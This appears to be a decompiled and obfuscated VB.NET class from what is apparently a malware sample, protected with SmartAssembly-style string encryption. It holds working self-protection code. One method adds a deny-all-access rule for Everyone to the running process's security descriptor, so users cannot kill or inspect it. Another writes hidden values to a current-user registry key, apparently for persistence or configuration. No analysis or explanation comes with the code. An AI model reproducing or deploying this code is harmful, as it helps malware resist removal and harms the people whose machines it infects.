Imports System
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports Microsoft.Win32
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000012 RID: 18
	Friend NotInheritable Class dDyurqCmIYO
		' Token: 0x06000057 RID: 87
		Private Declare Function GetKernelObjectSecurity Lib "advapi32.dll" (OaApsaiJWBTboDYV As IntPtr, GGYDxIzgOEHe As Integer, <Out()> pcjIlFgZfJzCxk As Byte(), egboQbWvdYUp As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef vtuwIBfmZuHHB As UInteger) As Boolean

		' Token: 0x06000058 RID: 88
		Private Declare Function SetKernelObjectSecurity Lib "advapi32.dll" (FrcYMHQHnHUlB As IntPtr, tVMHAivbcumDjO As Integer, <[In]()> bVUUJPXRQqeQHa As Byte()) As Boolean

		' Token: 0x06000059 RID: 89
		Private Declare Function GetCurrentProcess Lib "kernel32.dll" () As IntPtr

		' Token: 0x0600005A RID: 90 RVA: 0x0000C57C File Offset: 0x0000A77C
		Public Sub iRhAYdJtRklx(bool_0 As Boolean)
			Try
				Dim registryKey As RegistryKey = Registry.CurrentUser.CreateSubKey(PFruJiQrcriiZ.GwTsezEgVAuVAU(dDyurqCmIYO.getString_0(107403392)))
				registryKey.SetValue(PFruJiQrcriiZ.GwTsezEgVAuVAU(dDyurqCmIYO.getString_0(107403255)), dDyurqCmIYO.getString_0(107404405))
				registryKey.Close()
			Catch
			End Try
		End Sub

		' Token: 0x0600005B RID: 91 RVA: 0x0000C5EC File Offset: 0x0000A7EC
		Private Function KJiAghXcDInbeBqcBB(intptr_0 As IntPtr) As RawSecurityDescriptor
			Dim array As Byte() = New Byte(-1) {}
			Dim num As UInteger
			dDyurqCmIYO.GetKernelObjectSecurity(intptr_0, 4, array, 0UI, num)
			If CULng(num) > 32767UL Then
				Return Nothing
			End If
			Dim num2 As Integer = 4
			Dim array2 As Byte() = New Byte(num - 1) {}
			array = array2
			If Not dDyurqCmIYO.GetKernelObjectSecurity(intptr_0, num2, array2, num, num) Then
				Return Nothing
			End If
			Return New RawSecurityDescriptor(array, 0)
		End Function

		' Token: 0x0600005C RID: 92 RVA: 0x0000C63C File Offset: 0x0000A83C
		Private Sub mIZccETANlKcj(intptr_0 As IntPtr, rawSecurityDescriptor_0 As RawSecurityDescriptor)
			Dim array As Byte() = New Byte(rawSecurityDescriptor_0.BinaryLength - 1) {}
			rawSecurityDescriptor_0.GetBinaryForm(array, 0)
			dDyurqCmIYO.SetKernelObjectSecurity(intptr_0, 4, array)
		End Sub

		' Token: 0x0600005D RID: 93 RVA: 0x0000C668 File Offset: 0x0000A868
		Public Sub snmtsQVthnGhgVm()
			Try
				Dim currentProcess As IntPtr = dDyurqCmIYO.GetCurrentProcess()
				Dim rawSecurityDescriptor As RawSecurityDescriptor = Me.KJiAghXcDInbeBqcBB(currentProcess)
				rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
				Me.mIZccETANlKcj(currentProcess, rawSecurityDescriptor)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600005F RID: 95 RVA: 0x000028D5 File Offset: 0x00000AD5
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(dDyurqCmIYO))
		End Sub

		' Token: 0x04000090 RID: 144
		<NonSerialized()>
		Friend Shared getString_0 As GetString
	End Class
End Namespace
